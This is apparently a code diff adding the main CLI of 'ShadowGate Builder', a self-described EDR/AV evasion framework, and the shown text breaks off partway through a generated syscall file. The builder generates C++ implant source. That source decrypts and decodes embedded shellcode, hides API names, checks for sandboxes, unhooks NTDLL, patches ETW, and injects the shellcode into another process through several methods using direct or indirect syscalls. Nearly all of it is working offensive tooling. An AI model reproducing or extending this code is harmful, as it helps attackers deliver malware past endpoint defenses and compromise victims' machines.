@@ -1,0 +1,3102 @@
+#!/usr/bin/env python3
+"""
+ShadowGate Builder v3.0
+Ultimate EDR/AV Evasion Framework
+BARBAROSSA + HookChain Integration
+
+Main CLI Entry Point
+"""
+
+import os
+import sys
+import argparse
+import shutil
+from pathlib import Path
+from datetime import datetime
+from typing import Optional, Dict
+
+# Add parent directory to path for imports
+sys.path.insert(0, str(Path(__file__).parent.parent))
+
+# Import our modules
+from .config import (
+    ConfigManager, BuildConfig, DEFAULT_PROFILE,
+    SYSCALL_DIRECT, SYSCALL_INDIRECT,
+    RESOLVER_PEB, RESOLVER_FRESH, RESOLVER_HYBRID,
+    STRINGS_NONE, STRINGS_DJB2, STRINGS_XOR, STRINGS_STACK,
+    ENCRYPT_XOR, ENCRYPT_AES, ENCRYPT_CASCADE,
+    ENCODE_UUID, ENCODE_MAC, ENCODE_IPV4, ENCODE_RAW,
+    INJECT_STOMP, INJECT_EARLYBIRD, INJECT_THREADPOOL,
+    INJECT_HOLLOWING, INJECT_MAPPING
+)
+from .crypto import CryptoEngine, CRYPTO_AVAILABLE
+from .encoder import ShellcodeEncoder
+from .hashing import HashEngine, StringObfuscator
+from .entropy import EntropyAnalyzer, TARGET_ENTROPY
+from .compiler import MSVCCompiler
+
+
+# ============================================================================
+# Constants
+# ============================================================================
+
+VERSION = "3.0.0"
+CODENAME = "SHADOWGATE"
+
+BANNER = r"""
+   _____ __              __               ______      __     
+  / ___// /_  ____ _____/ /___ _      __ / ____/___ _/ /____ 
+  \__ \/ __ \/ __ `/ __  / __ \ | /| / // / __/ __ `/ __/ _ \
+ ___/ / / / / /_/ / /_/ / /_/ / |/ |/ // /_/ / /_/ / /_/  __/
+/____/_/ /_/\__,_/\__,_/\____/|__/|__/ \____/\__,_/\__/\___/ 
+                                                              
+    ╔══════════════════════════════════════════════════════╗
+    ║  BARBAROSSA + HookChain Integration  |  Version {version}  ║
+    ║  Direct/Indirect Syscalls  |  Multi-Layer Evasion    ║
+    ╚══════════════════════════════════════════════════════╝
+"""
+
+# Color codes for terminal
+class Colors:
+    HEADER = '\033[95m'
+    BLUE = '\033[94m'
+    CYAN = '\033[96m'
+    GREEN = '\033[92m'
+    YELLOW = '\033[93m'
+    RED = '\033[91m'
+    ENDC = '\033[0m'
+    BOLD = '\033[1m'
+
+def colored(text: str, color: str) -> str:
+    """Add color to text if terminal supports it"""
+    if sys.platform == 'win32':
+        # Enable ANSI on Windows
+        try:
+            import ctypes
+            kernel32 = ctypes.windll.kernel32
+            kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
+        except:
+            return text
+    return f"{color}{text}{Colors.ENDC}"
+
+
+# ============================================================================
+# Code Generator Class (from previous section - abbreviated)
+# ============================================================================
+
+class CodeGenerator:
+    """Generates C++ source code from templates and configuration"""
+    
+    def __init__(self, config: BuildConfig, base_dir: Path):
+        self.config = config
+        self.base_dir = base_dir
+        self.templates_dir = base_dir / "templates"
+        self.crypto = CryptoEngine()
+        self.encoder = ShellcodeEncoder()
+        self.hasher = HashEngine()
+        self.entropy_analyzer = EntropyAnalyzer()
+    
+    def generate(self, shellcode: bytes) -> Dict[str, str]:
+        """
+        Generate all source files
+        
+        Args:
+            shellcode: Raw shellcode bytes
+            
+        Returns:
+            Dictionary mapping filename to content
+        """
+        files = {}
+        
+        print(colored("\n[*] Starting code generation...", Colors.CYAN))
+        
+        # Step 1: Generate encryption keys
+        print(colored("[*] Generating encryption keys...", Colors.CYAN))
+        self.crypto.generate_keys()
+        
+        # Step 2: Encrypt shellcode
+        print(colored(f"[*] Encrypting shellcode ({self.config.encrypt})...", Colors.CYAN))
+        encrypted = self.crypto.encrypt(shellcode, self.config.encrypt)
+        
+        print(f"    Original size:  {len(shellcode):,} bytes")
+        print(f"    Encrypted size: {len(encrypted):,} bytes")
+        
+        # Step 3: Analyze entropy
+        orig_entropy = self.entropy_analyzer.calculate_entropy(shellcode)
+        enc_entropy = self.entropy_analyzer.calculate_entropy(encrypted)
+        
+        entropy_status = colored("✓", Colors.GREEN) if enc_entropy <= TARGET_ENTROPY else colored("⚠", Colors.YELLOW)
+        print(f"    Original entropy:  {orig_entropy:.2f}")
+        print(f"    Encrypted entropy: {enc_entropy:.2f} {entropy_status}")
+        
+        # Step 4: Encode shellcode
+        print(colored(f"[*] Encoding shellcode ({self.config.encode})...", Colors.CYAN))
+        encoded_data, encoded_cpp, original_len = self.encoder.encode(encrypted, self.config.encode)
+        
+        if isinstance(encoded_data, list):
+            print(f"    Encoded elements: {len(encoded_data)}")
+        
+        # Step 5: Generate API hashes
+        api_hashes_cpp = ""
+        if self.config.strings == STRINGS_DJB2:
+            print(colored("[*] Generating API hashes (djb2)...", Colors.CYAN))
+            api_hashes_cpp = self._generate_api_hashes()
+        
+        # Step 6: Generate string obfuscation
+        print(colored(f"[*] Generating string obfuscation ({self.config.strings})...", Colors.CYAN))
+        strings_cpp = self._generate_string_obfuscation()
+        
+        # Step 7: Generate main.cpp
+        print(colored("[*] Generating main.cpp...", Colors.CYAN))
+        main_cpp = self._generate_main_cpp(
+            encoded_cpp=encoded_cpp,
+            crypto_keys_cpp=self.crypto.generate_cpp_keys(),
+            crypto_funcs_cpp=self.crypto.generate_cpp_decrypt_functions(self.config.encrypt),
+            decoder_cpp=self.encoder.generate_cpp_decoder(self.config.encode),
+            api_hashes_cpp=api_hashes_cpp,
+            strings_cpp=strings_cpp,
+        )
+        files['main.cpp'] = main_cpp
+        
+        # Step 8: Generate syscall files
+        print(colored(f"[*] Generating syscall code ({self.config.syscall})...", Colors.CYAN))
+        syscall_files = self._generate_syscall_files()
+        files.update(syscall_files)
+        
+        # Step 9: Generate resolver files
+        print(colored(f"[*] Generating resolver code ({self.config.resolver})...", Colors.CYAN))
+        resolver_files = self._generate_resolver_files()
+        files.update(resolver_files)
+        
+        # Step 10: Generate injection files
+        print(colored(f"[*] Generating injection code ({self.config.inject})...", Colors.CYAN))
+        injection_files = self._generate_injection_files()
+        files.update(injection_files)
+        
+        # Step 11: Generate evasion files
+        print(colored("[*] Generating evasion code...", Colors.CYAN))
+        evasion_files = self._generate_evasion_files()
+        files.update(evasion_files)
+        
+        # Step 12: Generate common headers
+        print(colored("[*] Generating common headers...", Colors.CYAN))
+        common_files = self._generate_common_files()
+        files.update(common_files)
+        
+        print(colored(f"[+] Generated {len(files)} source files", Colors.GREEN))
+        
+        return files
+    
+    def _generate_api_hashes(self) -> str:
+        """Generate API hash definitions"""
+        common_apis = [
+            "NtAllocateVirtualMemory",
+            "NtProtectVirtualMemory", 
+            "NtWriteVirtualMemory",
+            "NtReadVirtualMemory",
+            "NtCreateThreadEx",
+            "NtOpenProcess",
+            "NtClose",
+            "NtQueryInformationProcess",
+            "NtQueryVirtualMemory",
+            "NtFreeVirtualMemory",
+            "NtResumeThread",
+            "NtSuspendThread",
+            "NtQueueApcThread",
+            "NtWaitForSingleObject",
+            "NtDelayExecution",
+            "NtCreateSection",
+            "NtMapViewOfSection",
+            "NtUnmapViewOfSection",
+            "NtTerminateProcess",
+        ]
+        
+        return self.hasher.generate_cpp_defines(common_apis, "djb2", skip_prefix=2)
+    
+    def _generate_string_obfuscation(self) -> str:
+        """Generate obfuscated strings"""
+        strings_to_obfuscate = [
+            ("ntdll.dll", "g_szNtdll"),
+            ("kernel32.dll", "g_szKernel32"),
+            ("kernelbase.dll", "g_szKernelbase"),
+            ("amsi.dll", "g_szAmsi"),
+            ("user32.dll", "g_szUser32"),
+        ]
+        
+        code_lines = []
+        code_lines.append("// ============================================================================")
+        code_lines.append("// Obfuscated Strings")
+        code_lines.append("// ============================================================================\n")
+        
+        if self.config.strings == STRINGS_NONE:
+            # Plain strings
+            for string, var_name in strings_to_obfuscate:
+                code_lines.append(f'const char {var_name}[] = "{string}";')
+        
+        elif self.config.strings == STRINGS_XOR:
+            # XOR obfuscated
+            for string, var_name in strings_to_obfuscate:
+                code_lines.append(StringObfuscator.generate_xor_string_cpp(string, var_name, 0x5A))
+        
+        elif self.config.strings == STRINGS_STACK:
+            # Stack strings
+            code_lines.append("// Stack strings - call these functions to get the string")
+            for string, var_name in strings_to_obfuscate:
+                func_name = f"Get{var_name[2:]}"  # Remove "g_" prefix
+                code_lines.append(f"\n__forceinline void {func_name}(char* out) {{")
+                for i, c in enumerate(string):
+                    code_lines.append(f"    out[{i}] = '{c}';")
+                code_lines.append(f"    out[{len(string)}] = '\\0';")
+                code_lines.append("}")
+        
+        elif self.config.strings == STRINGS_DJB2:
+            # Hash-based (no strings at all, use hashes)
+            code_lines.append("// Using hash-based API resolution - no string storage needed")
+            code_lines.append(self.hasher.generate_cpp_hash_function("djb2"))
+        
+        return '\n'.join(code_lines)
+    
+    def _generate_main_cpp(self, encoded_cpp: str, crypto_keys_cpp: str,
+                          crypto_funcs_cpp: str, decoder_cpp: str,
+                          api_hashes_cpp: str, strings_cpp: str) -> str:
+        """Generate the main.cpp file"""
+        
+        # Determine injection method constant
+        inject_map = {
+            INJECT_STOMP: "INJECT_STOMP",
+            INJECT_EARLYBIRD: "INJECT_EARLYBIRD",
+            INJECT_THREADPOOL: "INJECT_THREADPOOL",
+            INJECT_HOLLOWING: "INJECT_HOLLOWING",
+            INJECT_MAPPING: "INJECT_MAPPING",
+        }
+        inject_const = inject_map.get(self.config.inject, "INJECT_STOMP")
+        
+        # Generate target process string
+        target_process = self.config.target.replace("\\", "\\\\")
+        
+        code = f'''/*
+ * ============================================================================
+ * ShadowGate - EDR/AV Evasion Implant
+ * Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
+ * ============================================================================
+ * 
+ * Configuration:
+ *   Syscall Method:  {self.config.syscall.upper()}
+ *   NTDLL Resolver:  {self.config.resolver.upper()}
+ *   String Hiding:   {self.config.strings.upper()}
+ *   Encryption:      {self.config.encrypt.upper()}
+ *   Encoding:        {self.config.encode.upper()}
+ *   Injection:       {self.config.inject.upper()}
+ *   Sandbox Checks:  {"ENABLED" if self.config.sandbox else "DISABLED"}
+ *   ETW Patching:    {"ENABLED" if self.config.etw else "DISABLED"}
+ *   NTDLL Unhook:    {"ENABLED" if self.config.unhook else "DISABLED"}
+ * 
+ * ============================================================================
+ */
+
+#include <windows.h>
+#include <stdio.h>
+#include <string.h>
+
+#include "common.h"
+#include "syscalls.h"
+#include "resolver.h"
+#include "injection.h"
+#include "evasion.h"
+
+// ============================================================================
+// Build Configuration
+// ============================================================================
+
+#define SYSCALL_METHOD      SYSCALL_{self.config.syscall.upper()}
+#define RESOLVER_METHOD     RESOLVER_{self.config.resolver.upper()}
+#define INJECTION_METHOD    {inject_const}
+#define TARGET_PROCESS      L"{target_process}"
+#define INITIAL_SLEEP       {self.config.sleep}
+
+#define ENABLE_SANDBOX      {1 if self.config.sandbox else 0}
+#define ENABLE_ETW_PATCH    {1 if self.config.etw else 0}
+#define ENABLE_UNHOOK       {1 if self.config.unhook else 0}
+#define DEBUG_BUILD         {1 if self.config.debug else 0}
+
+// ============================================================================
+// Output Macros
+// ============================================================================
+
+#if DEBUG_BUILD
+    #define LOG_INFO(fmt, ...)    printf("[*] " fmt "\\n", ##__VA_ARGS__)
+    #define LOG_SUCCESS(fmt, ...) printf("[+] " fmt "\\n", ##__VA_ARGS__)
+    #define LOG_ERROR(fmt, ...)   printf("[!] " fmt "\\n", ##__VA_ARGS__)
+    #define LOG_PHASE(fmt, ...)   printf("\\n[=] " fmt "\\n", ##__VA_ARGS__)
+#else
+    #define LOG_INFO(fmt, ...)
+    #define LOG_SUCCESS(fmt, ...)
+    #define LOG_ERROR(fmt, ...)
+    #define LOG_PHASE(fmt, ...)
+#endif
+
+// ============================================================================
+// API Hashes
+// ============================================================================
+
+{api_hashes_cpp}
+
+// ============================================================================
+// Obfuscated Strings
+// ============================================================================
+
+{strings_cpp}
+
+// ============================================================================
+// Encryption Keys
+// ============================================================================
+
+{crypto_keys_cpp}
+
+// ============================================================================
+// Encoded Shellcode
+// ============================================================================
+
+{encoded_cpp}
+
+// ============================================================================
+// Decryption Functions
+// ============================================================================
+
+{crypto_funcs_cpp}
+
+// ============================================================================
+// Decoder Function
+// ============================================================================
+
+{decoder_cpp}
+
+// ============================================================================
+// Banner
+// ============================================================================
+
+#if DEBUG_BUILD
+void PrintBanner() {{
+    printf("\\n");
+    printf("   _____ __              __               ______      __     \\n");
+    printf("  / ___// /_  ____ _____/ /___ _      __ / ____/___ _/ /____ \\n");
+    printf("  \\\\__ \\\\/ __ \\\\/ __ `/ __  / __ \\\\ | /| / // / __/ __ `/ __/ _ \\\\\\n");
+    printf(" ___/ / / / / /_/ / /_/ / /_/ / |/ |/ // /_/ / /_/ / /_/  __/\\n");
+    printf("/____/_/ /_/\\\\__,_/\\\\__,_/\\\\____/|__/|__/ \\\\____/\\\\__,_/\\\\__/\\\\___/ \\n");
+    printf("\\n");
+    printf("    [Syscall: {self.config.syscall.upper()} | Resolver: {self.config.resolver.upper()} | Inject: {self.config.inject.upper()}]\\n");
+    printf("\\n");
+}}
+#endif
+
+// ============================================================================
+// Main Entry Point
+// ============================================================================
+
+int main(int argc, char** argv) {{
+    NTSTATUS status;
+    
+#if DEBUG_BUILD
+    PrintBanner();
+#endif
+    
+    // ========================================================================
+    // Phase 1: Initial Delay
+    // ========================================================================
+#if INITIAL_SLEEP > 0
+    LOG_PHASE("Phase 1: Initial Sleep (%d seconds)", INITIAL_SLEEP);
+    Sleep(INITIAL_SLEEP * 1000);
+#endif
+    
+    // ========================================================================
+    // Phase 2: Sandbox Evasion
+    // ========================================================================
+#if ENABLE_SANDBOX
+    LOG_PHASE("Phase 2: Sandbox Evasion");
+    if (!PerformSandboxChecks()) {{
+        LOG_ERROR("Sandbox/VM detected - exiting");
+        return -1;
+    }}
+    LOG_SUCCESS("Environment checks passed");
+#endif
+    
+    // ========================================================================
+    // Phase 3: Syscall Resolution
+    // ========================================================================
+    LOG_PHASE("Phase 3: Syscall Resolution");
+    if (!InitializeSyscalls()) {{
+        LOG_ERROR("Failed to resolve syscalls");
+        return -1;
+    }}
+    LOG_SUCCESS("Syscalls resolved successfully");
+    
+    // ========================================================================
+    // Phase 4: NTDLL Unhooking (Optional)
+    // ========================================================================
+#if ENABLE_UNHOOK
+    LOG_PHASE("Phase 4: NTDLL Unhooking");
+    if (!UnhookNtdll()) {{
+        LOG_ERROR("Failed to unhook NTDLL (continuing anyway)");
+    }} else {{
+        LOG_SUCCESS("NTDLL unhooked successfully");
+    }}
+#endif
+    
+    // ========================================================================
+    // Phase 5: ETW Patching (Optional)
+    // ========================================================================
+#if ENABLE_ETW_PATCH
+    LOG_PHASE("Phase 5: ETW Patching");
+    if (!PatchETW()) {{
+        LOG_ERROR("ETW patching failed (continuing anyway)");
+    }} else {{
+        LOG_SUCCESS("ETW patched successfully");
+    }}
+#endif
+    
+    // ========================================================================
+    // Phase 6: Shellcode Decoding
+    // ========================================================================
+    LOG_PHASE("Phase 6: Shellcode Decoding");
+    
+    SIZE_T decodeBufferSize = g_OriginalSize + 256;
+    unsigned char* pDecoded = (unsigned char*)VirtualAlloc(
+        NULL, decodeBufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    
+    if (!pDecoded) {{
+        LOG_ERROR("Failed to allocate decode buffer");
+        return -1;
+    }}
+    
+    SIZE_T decodedLen = 0;
+    if (!DecodeShellcode(pDecoded, &decodedLen)) {{
+        LOG_ERROR("Shellcode decoding failed");
+        VirtualFree(pDecoded, 0, MEM_RELEASE);
+        return -1;
+    }}
+    LOG_SUCCESS("Decoded %zu bytes", decodedLen);
+    
+    // ========================================================================
+    // Phase 7: Shellcode Decryption
+    // ========================================================================
+    LOG_PHASE("Phase 7: Shellcode Decryption");
+    
+    unsigned char* pDecrypted = NULL;
+    SIZE_T decryptedLen = 0;
+    
+    if (!DecryptShellcode(pDecoded, decodedLen, &pDecrypted, &decryptedLen)) {{
+        LOG_ERROR("Shellcode decryption failed");
+        VirtualFree(pDecoded, 0, MEM_RELEASE);
+        return -1;
+    }}
+    
+    // Free decoded buffer (we have decrypted now)
+    VirtualFree(pDecoded, 0, MEM_RELEASE);
+    
+    LOG_SUCCESS("Decrypted %zu bytes", decryptedLen);
+    
+    // ========================================================================
+    // Phase 8: Shellcode Injection
+    // ========================================================================
+    LOG_PHASE("Phase 8: Shellcode Injection");
+    
+    INJECTION_CONTEXT ctx = {{ 0 }};
+    ctx.pShellcode = pDecrypted;
+    ctx.dwShellcodeSize = decryptedLen;
+    ctx.wszTargetProcess = TARGET_PROCESS;
+    ctx.dwInjectionMethod = INJECTION_METHOD;
+    
+#if DEBUG_BUILD
+    LOG_INFO("Press ENTER to inject...");
+    getchar();
+#endif
+    
+    if (!PerformInjection(&ctx)) {{
+        LOG_ERROR("Injection failed");
+        VirtualFree(pDecrypted, 0, MEM_RELEASE);
+        return -1;
+    }}
+    
+    LOG_SUCCESS("Injection successful!");
+    
+    // Cleanup
+    VirtualFree(pDecrypted, 0, MEM_RELEASE);
+    
+    return 0;
+}}
+'''
+        return code
+    
+    def _generate_syscall_files(self) -> dict:
+        """Generate syscall-related files"""
+        files = {}
+
+        # Common syscalls header
+        files['syscalls.h'] = self._generate_syscalls_h()
+
+        # Assembly file - RENAMED to avoid .obj collision
+        files['asm_syscalls.asm'] = self._generate_syscalls_asm()
+
+        # C++ implementation
+        files['syscalls.cpp'] = self._generate_syscalls_cpp()
+
+        return files
+        
+    def _generate_syscalls_asm(self) -> str:
+        """Generate syscall assembly"""
+        if self.config.syscall == SYSCALL_DIRECT:
+            syscall_instruction = '''    mov r10, rcx
+        mov eax, dword ptr [wCurrentSSN]
+        syscall
+        ret'''
+        else:  # INDIRECT
+            syscall_instruction = '''    mov r10, rcx
+        mov eax, dword ptr [wCurrentSSN]
+        jmp qword ptr [qSyscallAddr]'''
+
+        return f'''; ============================================================================
+; ShadowGate - Syscall Assembly ({self.config.syscall.upper()} Mode)
+; x64 Assembly for MASM (ml64)
+; ============================================================================
+
+; Export symbols for the linker
+PUBLIC SetSSN
+PUBLIC PrepareSyscall  
+PUBLIC DoSyscall
+
+.data
+    wCurrentSSN     DWORD 0
+    qSyscallAddr    QWORD 0
+
+.code
+
+; ============================================================================
+; SetSSN - Set System Service Number
+; RCX = SSN (first parameter in x64 calling convention)
+; ============================================================================
+SetSSN PROC FRAME
+    .endprolog
+    mov dword ptr [wCurrentSSN], ecx
+    ret
+SetSSN ENDP
+
+; ============================================================================
+; PrepareSyscall - Prepare SSN and syscall address for next call
+; RCX = SSN (DWORD)
+; RDX = Address of syscall instruction in NTDLL (PVOID)
+; ============================================================================
+PrepareSyscall PROC FRAME
+    .endprolog
+    mov dword ptr [wCurrentSSN], ecx
+    mov qword ptr [qSyscallAddr], rdx
+    ret
+PrepareSyscall ENDP
+
+; ============================================================================
+; DoSyscall - Execute syscall with parameters passed through
+; Parameters are already in RCX, RDX, R8, R9 and stack per x64 convention
+; ============================================================================
+DoSyscall PROC FRAME
+    .endprolog
+{syscall_instruction}
+DoSyscall ENDP
+
+END
+'''
+    
+    def _generate_syscalls_h(self) -> str:
+        """Generate syscalls.h header"""
+        return '''#ifndef _SYSCALLS_H
+#define _SYSCALLS_H
+
+#include <windows.h>
+#include "common.h"
+
+#ifdef __cplusplus
+extern "C" {
+#endif
+
+// ============================================================================
+// Syscall Method Selection
+// ============================================================================
+
+#define SYSCALL_DIRECT      1
+#define SYSCALL_INDIRECT    2
+
+// ============================================================================
+// Syscall Entry Structure
+// ============================================================================
+
+typedef struct _SYSCALL_ENTRY {
+    DWORD64     dwHash;
+    PVOID       pAddress;
+    DWORD       dwSSN;
+    PVOID       pSyscallAddr;
+    BOOL        bResolved;
+} SYSCALL_ENTRY, *PSYSCALL_ENTRY;
+
+// ============================================================================
+// Syscall Table
+// ============================================================================
+
+#define MAX_SYSCALLS 32
+
+extern SYSCALL_ENTRY g_SyscallTable[MAX_SYSCALLS];
+extern DWORD g_SyscallCount;
+
+// ============================================================================
+// Syscall Indices
+// ============================================================================
+
+#define IDX_NtAllocateVirtualMemory     0
+#define IDX_NtProtectVirtualMemory      1
+#define IDX_NtWriteVirtualMemory        2
+#define IDX_NtReadVirtualMemory         3
+#define IDX_NtCreateThreadEx            4
+#define IDX_NtOpenProcess               5
+#define IDX_NtClose                     6
+#define IDX_NtQueryInformationProcess   7
+#define IDX_NtQueryVirtualMemory        8
+#define IDX_NtFreeVirtualMemory         9
+#define IDX_NtResumeThread              10
+#define IDX_NtSuspendThread             11
+#define IDX_NtQueueApcThread            12
+#define IDX_NtWaitForSingleObject       13
+#define IDX_NtDelayExecution            14
+#define IDX_NtCreateSection             15
+#define IDX_NtMapViewOfSection          16
+#define IDX_NtUnmapViewOfSection        17
+#define IDX_NtTerminateProcess          18
+#define IDX_NtCreateProcessEx           19
+
+// ============================================================================
+// Initialization
+// ============================================================================
+
+BOOL InitializeSyscalls(VOID);
+DWORD GetSSN(DWORD dwIndex);
+PVOID GetSyscallAddress(DWORD dwIndex);
+
+// ============================================================================
+// Assembly Functions (defined in asm_syscalls.asm)
+// ============================================================================
+
+void SetSSN(DWORD ssn);
+void PrepareSyscall(DWORD ssn, PVOID pSyscallAddr);
+NTSTATUS DoSyscall();
+
+// Helper function
+void PrepareNextSyscall(DWORD dwIndex);
+
+// ============================================================================
+// NT Function Declarations
+// ============================================================================
+
+NTSTATUS NtAllocateVirtualMemory(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
+NTSTATUS NtProtectVirtualMemory(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
+NTSTATUS NtWriteVirtualMemory(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
+NTSTATUS NtReadVirtualMemory(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
+NTSTATUS NtCreateThreadEx(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
+NTSTATUS NtOpenProcess(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);
+NTSTATUS NtClose(HANDLE);
+NTSTATUS NtQueueApcThread(HANDLE, PVOID, PVOID, PVOID, PVOID);
+NTSTATUS NtResumeThread(HANDLE, PULONG);
+NTSTATUS NtWaitForSingleObject(HANDLE, BOOLEAN, PLARGE_INTEGER);
+NTSTATUS NtCreateSection(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
+NTSTATUS NtMapViewOfSection(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
+NTSTATUS NtUnmapViewOfSection(HANDLE, PVOID);
+
+#ifdef __cplusplus
+}
+#endif
+
+#endif // _SYSCALLS_H
+'''
+    
+    def _generate_syscalls_cpp(self) -> str:
+        """Generate syscalls.cpp implementation"""
+        return '''/*
+ * ShadowGate - Syscall Implementation
+ */
+
+#include "syscalls.h"
+#include "resolver.h"
+
+// External assembly functions (defined in asm_syscalls.asm)
+// These MUST be declared extern "C" to prevent C++ name mangling
+extern "C" void SetSSN(DWORD ssn);
+extern "C" void PrepareSyscall(DWORD ssn, PVOID pSyscallAddr);
+extern "C" NTSTATUS DoSyscall();
+
+// Global syscall table
+SYSCALL_ENTRY g_SyscallTable[MAX_SYSCALLS] = { 0 };
+DWORD g_SyscallCount = 0;
+
+BOOL InitializeSyscalls(VOID) {
+    return ResolveSyscalls(g_SyscallTable, &g_SyscallCount);
+}
+
+DWORD GetSSN(DWORD dwIndex) {
+    if (dwIndex >= MAX_SYSCALLS) return 0;
+    return g_SyscallTable[dwIndex].dwSSN;
+}
+
+PVOID GetSyscallAddress(DWORD dwIndex) {
+    if (dwIndex >= MAX_SYSCALLS) return NULL;
+    return g_SyscallTable[dwIndex].pSyscallAddr;
+}
+
+// Prepare syscall parameters before invoking DoSyscall
+extern "C" void PrepareNextSyscall(DWORD dwIndex) {
+    if (dwIndex < MAX_SYSCALLS && g_SyscallTable[dwIndex].bResolved) {
+        PrepareSyscall(g_SyscallTable[dwIndex].dwSSN, g_SyscallTable[dwIndex].pSyscallAddr);
+    }
+}
+
+// ============================================================================
+// NT Function Implementations
+// We use function pointer casts to call DoSyscall with the correct signature
+// ============================================================================
+
+typedef NTSTATUS (NTAPI *fn_NtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
+typedef NTSTATUS (NTAPI *fn_NtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
+typedef NTSTATUS (NTAPI *fn_NtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
+typedef NTSTATUS (NTAPI *fn_NtReadVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
+typedef NTSTATUS (NTAPI *fn_NtCreateThreadEx)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
+typedef NTSTATUS (NTAPI *fn_NtOpenProcess)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);
+typedef NTSTATUS (NTAPI *fn_NtClose)(HANDLE);
+typedef NTSTATUS (NTAPI *fn_NtQueueApcThread)(HANDLE, PVOID, PVOID, PVOID, PVOID);
+typedef NTSTATUS (NTAPI *fn_NtResumeThread)(HANDLE, PULONG);
+typedef NTSTATUS (NTAPI *fn_NtWaitForSingleObject)(HANDLE, BOOLEAN, PLARGE_INTEGER);
+typedef NTSTATUS (NTAPI *fn_NtCreateSection)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
+typedef NTSTATUS (NTAPI *fn_NtMapViewOfSection)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
+typedef NTSTATUS (NTAPI *fn_NtUnmapViewOfSection)(HANDLE, PVOID);
+
+NTSTATUS NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect) {
+    PrepareNextSyscall(IDX_NtAllocateVirtualMemory);
+    return ((fn_NtAllocateVirtualMemory)DoSyscall)(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
+}
+
+NTSTATUS NtProtectVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect) {
+    PrepareNextSyscall(IDX_NtProtectVirtualMemory);
+    return ((fn_NtProtectVirtualMemory)DoSyscall)(ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect);
+}
+
+NTSTATUS NtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T Size, PSIZE_T Written) {
+    PrepareNextSyscall(IDX_NtWriteVirtualMemory);
+    return ((fn_NtWriteVirtualMemory)DoSyscall)(ProcessHandle, BaseAddress, Buffer, Size, Written);
+}
+
+NTSTATUS NtReadVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T Size, PSIZE_T Read) {
+    PrepareNextSyscall(IDX_NtReadVirtualMemory);
+    return ((fn_NtReadVirtualMemory)DoSyscall)(ProcessHandle, BaseAddress, Buffer, Size, Read);
+}
+
+NTSTATUS NtCreateThreadEx(PHANDLE ThreadHandle, ACCESS_MASK Access, PVOID ObjAttr, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG Flags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaxStackSize, PVOID AttrList) {
+    PrepareNextSyscall(IDX_NtCreateThreadEx);
+    return ((fn_NtCreateThreadEx)DoSyscall)(ThreadHandle, Access, ObjAttr, ProcessHandle, StartRoutine, Argument, Flags, ZeroBits, StackSize, MaxStackSize, AttrList);
+}
+
+NTSTATUS NtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK Access, POBJECT_ATTRIBUTES ObjAttr, PCLIENT_ID ClientId) {
+    PrepareNextSyscall(IDX_NtOpenProcess);
+    return ((fn_NtOpenProcess)DoSyscall)(ProcessHandle, Access, ObjAttr, ClientId);
+}
+
+NTSTATUS NtClose(HANDLE Handle) {
+    PrepareNextSyscall(IDX_NtClose);
+    return ((fn_NtClose)DoSyscall)(Handle);
+}
+
+NTSTATUS NtQueueApcThread(HANDLE ThreadHandle, PVOID ApcRoutine, PVOID Arg1, PVOID Arg2, PVOID Arg3) {
+    PrepareNextSyscall(IDX_NtQueueApcThread);
+    return ((fn_NtQueueApcThread)DoSyscall)(ThreadHandle, ApcRoutine, Arg1, Arg2, Arg3);
+}
+
+NTSTATUS NtResumeThread(HANDLE ThreadHandle, PULONG SuspendCount) {
+    PrepareNextSyscall(IDX_NtResumeThread);
+    return ((fn_NtResumeThread)DoSyscall)(ThreadHandle, SuspendCount);
+}
+
+NTSTATUS NtWaitForSingleObject(HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout) {
+    PrepareNextSyscall(IDX_NtWaitForSingleObject);
+    return ((fn_NtWaitForSingleObject)DoSyscall)(Handle, Alertable, Timeout);
+}
+
+NTSTATUS NtCreateSection(PHANDLE SectionHandle, ACCESS_MASK Access, POBJECT_ATTRIBUTES ObjAttr, PLARGE_INTEGER MaxSize, ULONG Protect, ULONG Alloc, HANDLE FileHandle) {
+    PrepareNextSyscall(IDX_NtCreateSection);
+    return ((fn_NtCreateSection)DoSyscall)(SectionHandle, Access, ObjAttr, MaxSize, Protect, Alloc, FileHandle);
+}
+
